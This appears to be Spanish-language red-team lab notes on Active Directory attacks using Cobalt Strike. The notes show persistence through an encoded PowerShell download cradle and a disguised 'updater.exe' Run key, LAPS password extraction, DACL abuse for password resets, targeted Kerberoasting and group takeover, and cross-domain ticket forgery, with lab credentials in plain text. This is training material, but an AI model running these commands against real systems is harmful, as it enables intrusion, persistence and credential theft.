la carpeta de inicio se ubica en el siguiente path `C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\` es ahi donde podemos soltar un binario, o un lnk malicioso como lo hace **sharpersist**.

```powershell
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
```

##### Registry Autorun
el registro que se suele ejecutar durante el inicio de sesion es el siguiente: 

```txt
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

Primero debemos crear una carga util, para que el registro apunte hacia ella y la ejecute en el inicio

```batch
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

| Argumento | Explanation                                         |
| --------- | --------------------------------------------------- |
| -k        | es la clave del registro a modificar                |
| -v        | el nombre de la clave de registro que se va a crear |
|           |                                                     |

tambien podemos usar la colmena de **"HKLM"** pero para ella necesitamos privilegios de administrador, ya que es la colmena general de registros del equipo y no personal del usuario como lo es **"HKCLU"**.

### Laps
**Utilizando Powerview**

```shell
# Identificar si la maquina actual que comprometimos es un cliente de laps
ls C:\Program Files\LAPS\CSE

#Busque objetos del dominio donde la propiedad `ms-Mcs-AdmPwdExpirationTime` no sea nula (cualquier usuario de dominio puede leer esta propiedad).
powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=evilcorp,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io

# Identificar posibles GPOS con laps para extraer su propiedad 'gpcfilesyspath' y descargar la configuracion para despues poder parsearla con el modulo 
# GPRegistryPolicyParser.psm1 y la funcion "Parse-PolFile"
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

download \\dev.evilcorp.local\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol

Parse-PolFile .\Registry.pol

```

Utilizando el cmdlet nativo de laps para administrar

```shell
# checkeando si esta instalado el cmdlet
powershell Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# Enumerar usuarios de LAPS con permisos para Leer contraseñas en una OU dada
powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=dev,DC=evilcorp,DC=local
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, DEV\Admins. del dominio, DEV\Laps Operators}

# Leer las contraseñas en este caso utilizaremos al usuario c.rodolfo que es parte del grupo laps operators que tienen permisos de administrar laps.
powershell Get-AdmPwdPassword -ComputerName wkstn-1 | fl

ComputerName        : WKSTN-1
DistinguishedName   : CN=WKSTN-1,OU=Workstations,DC=dev,DC=evilcorp,DC=local
Password            : &OF[T;#k$5Wg
ExpirationTimestamp : 24/02/2022 15:30:09

## Teniendo la contraseña podemos movernos lateralmente con psexec,wmiexec o cobalt.

## alternativa II
powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=evilcorp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

ObjectDN                                              SecurityIdentifier
--------                                              ------------------
OU=Workstations,DC=dev,DC=cyberbotic,DC=io            S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support

beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
P0OPwa4R64AkbJ

```

---

## Listas de control de acceso discrecional (DACL)
Puede haber instancias en todo el dominio en las que algunos directores tengan ACL en cuentas más privilegiadas, lo que permite abusar de ellas para apoderarse de la cuenta. Un ejemplo simple de esto podría ser un grupo de "soporte" que puede restablecer las contraseñas de los "Administradores de dominio"

Podemos comenzar dirigiéndonos a un solo principal. Esta consulta devolverá cualquier principal que tenga **GenericAll** , **WriteProperty** o **WriteDacl** en la cuenta de usuario jadams
```powershell
powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-2697495467-513533215-122973509-[\d]{4,10}" } | select SecurityIdentifier, ActiveDirectoryRights | fl

SecurityIdentifier    : S-1-5-21-2697495467-513533215-122973509-1137
ActiveDirectoryRights : GenericAll

SecurityIdentifier    : S-1-5-21-2697495467-513533215-122973509-1137
ActiveDirectoryRights : GenericAll

powershell ConvertFrom-SID "S-1-5-21-2697495467-513533215-122973509-1137"
DEV\1st line support
```

También podríamos lanzar una red más amplia y apuntar a unidades organizativas completas.

```powershell
powershell Get-DomainObjectAcl -SearchBase "CN=Users,DC=dev,DC=evilcorp,DC=local" | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-2697495467-513533215-122973509-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=1st Line Support,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN              : CN=Oracle Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125
```

Esto muestra que 1st Line Support tiene **GenericAll** en varios usuarios y grupos. Entonces, **¿cómo podemos abusar de estos?**

### Abusando de DACL⚔

##### Reset User Password
Reset a user's password (pretty bad OPSEC). 🎈
```powershell
beacon> make_token DEV\jking Purpl3Drag0n
[*] Tasked beacon to create a token for DEV\jking
[+] host called home, sent: 52 bytes
[+] Impersonated DEV\svc_test

beacon> run net user TestAcl NewPassword! /domain
[*] Tasked beacon to run: net user TestAcl NewPassword! /domain
[+] host called home, sent: 67 bytes
[+] received output:
Se procesara la solicitud en un controlador de dominio del dominio dev.evilcorp.local.

Se ha completado el comando correctamente.
```

##### Targeted Kerberoasting
En lugar de cambiar la contraseña, podemos configurar un SPN en la cuenta, hacer kerberoast e intentar crackear el password offline.

```powershell
# Asignando un SPN a una cuenta
powershell Set-DomainObject -Identity TestAcl -Set @{serviceprincipalname="fake/service"}

# Comprobando SPN
beacon> powershell Get-DomainUser -Identity "TestAcl" -Properties samaccountname,serviceprincipalname,Lastlogon
[*] Tasked beacon to run: Get-DomainUser -Identity "TestAcl" -Properties samaccountname,serviceprincipalname,Lastlogon
[+] host called home, sent: 529 bytes
[+] received output:

lastlogon          serviceprincipalname samaccountname
---------          -------------------- --------------
01/01/1601 1:00:00 fake/service         TestAcl

# Aplicando Kerberoast
beacon> execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user:testacl /nowrap

# Removiendo un SPN asignado a un usuario
powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName

```

##### Targeted ASREPRoasting
Es la misma que la anterior nada mas que esta vez modificamos un valor para que el objeto tenga la bandera `DONT_REQ_PREAUTH`

```powershell
beacon> powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue

Name                           Value                                                                                   
----                           -----                                                                                   
NORMAL_ACCOUNT                 512                                                                                     
DONT_EXPIRE_PASSWORD           65536                                                                                   


# Modificamos el valor de userAccountControl
powershell Set-DomainObject -Identity TestAcl -XOR @{UserAccountControl=4194304}

# Chequeamos
powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue

Name                           Value                                                                                   
----                           -----                                                                                   
NORMAL_ACCOUNT                 512                                                                                     
DONT_EXPIRE_PASSWORD           65536                                                                                   
DONT_REQ_PREAUTH               4194304 


# Aplicando ASREPROAST
execute-assembly /opt/tools/rubeus/Rubeus.exe asreproast /user:TestAcl /nowrap

# Quitar el valor modificado del la propiedad userAccountControl
powershell Set-DomainObject -Identity TestAcl -XOR @{UserAccountControl=4194304} -Verbose

# Chequeamos
powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue

Name                           Value                                                                                   
----                           -----                                                                                   
NORMAL_ACCOUNT                 512                                                                                     
DONT_EXPIRE_PASSWORD           65536                                                                                   
     
```

##### Modificar la pertenencia a un grupo de dominio
Si tenemos la ACL en un grupo, podemos agregar y eliminar miembros.
```powershell
run net group "Oracle Admins" TestAcl /add /domain

# Chequeando
beacon> powershell Get-DomainGroupMember "Oracle Admins"

GroupDomain             : dev.evilcorp.local
GroupName               : Oracle Admins
GroupDistinguishedName  : CN=Oracle Admins,CN=Users,DC=dev,DC=evilcorp,DC=local
MemberDomain            : dev.evilcorp.local
MemberName              : TestAcl
MemberDistinguishedName : CN=TestAcl,CN=Users,DC=dev,DC=evilcorp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-2697495467-513533215-122973509-1138
```

> 🎇Hay otras DACL interesantes que pueden conducir a abusos similares. Por ejemplo, con **WriteDacl** puede otorgar **GenericAll** a cualquier principal. Con **WriteOwner** , puede cambiar la propiedad del objeto a cualquier principal que luego heredaría GenericAll sobre él. 

---

### Forest And Domain Trust

#### Inbound ➡

Debido a que la confianza es entrante desde nuestra perspectiva, significa que a los principales en nuestro dominio se les puede otorgar acceso a los recursos en el dominio externo.

```powershell
# Map Trust Domains
powershell Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection 

SourceName         TargetName         TrustDirection
----------         ----------         --------------
dev.evilcorp.local evilcorp.local     Bidirectional 
dev.evilcorp.local sucursal.external  Inbound       
sucursal.external  dev.evilcorp.local Outbound      
evilcorp.local     dev.evilcorp.local Bidirectional 
evilcorp.local     madrid.external    Outbound

# Domain trust 
powershell Get-DomainTrust 
powershell Get-DomainTrust -Domain evilcorp.local

# Idenfiticar equipos del dominio externo
powershell Get-DomainComputer -Domain sucursal.external | select dnshostname

# Get-DomainForeignGroupMember enumerará cualquier grupo que contenga usuarios fuera de su dominio y devolverá sus miembros.
powershell Get-DomainForeignGroupMember -Domain sucursal.external

GroupDomain             : sucursal.external
GroupName               : Administradores
GroupDistinguishedName  : CN=Administradores,CN=Builtin,DC=sucursal,DC=external
MemberDomain            : sucursal.external
MemberName              : S-1-5-21-2697495467-513533215-122973509-1148
MemberDistinguishedName : CN=S-1-5-21-2697495467-513533215-122973509-1148,CN=ForeignSecurityPrincipals,DC=sucursal,DC=external

# Convertir SID para saber que usuario/grupo pertenece al grupo administradores del dominio con relacion entrante
powershell ConvertFrom-SID "S-1-5-21-2697495467-513533215-122973509-1148"
DEV\Subsidiary Admins

# Enumerar defensas
execute-assembly /opt/tools/Seatbelt.exe AMSIProviders AntiVirus AppLocker Powershell UAC -computername="ad.sucursal.external"

# Enumerar Grupos Local
powershell Get-NetLocalGroupMember -ComputerName ad.sucursal.external


# Listar recursos
make_token dev\jadams Qwerty123!

ls \\ad.sucursal.external\c$

---

####################################
#		  RC4/AES256			   #
####################################

# 1. Solicitamos un tgt del usuario que este en el usuario externo
execute-assembly /opt/tools/rubeus/Rubeus.exe asktgt /user:jadams /domain:dev.evilcorp.local /aes256:5C8838A1D0F155C70ABB3C93ADACF1912826F149E276A445EF76E7821A89390A /nowrap /opsec

# 2. Solicitamos un ticket de referencia entre reinos
execute-assembly /opt/tools/rubeus/Rubeus.exe asktgs /user:jadams /service:krbtgt/sucursal.external /domain:dev.evilcorp.local /dc:dc-2.dev.evilcorp.local /ticket:[..Ticket..] /nowrap

# 3. Con el TGS de referencia entre reinos solicitados anteriormente, ahora solicitamos un tgs en el dominio de destino
execute-assembly /opt/tools/rubeus/Rubeus.exe asktgs /service:cifs/ad.sucursal.external /domain:sucursal.external /dc:ad.sucursal.external /ticket:[..TGS de Referencia..]= /nowrap

# Impersonalizamos al usuario e inyectamos el ticket
make_token dev\jadams Fakepassw!

execute-assembly /opt/tools/rubeus/Rubeus.exe ptt /ticket:[..Tgs..]

ls \\ad.sucursal.external\c$

```

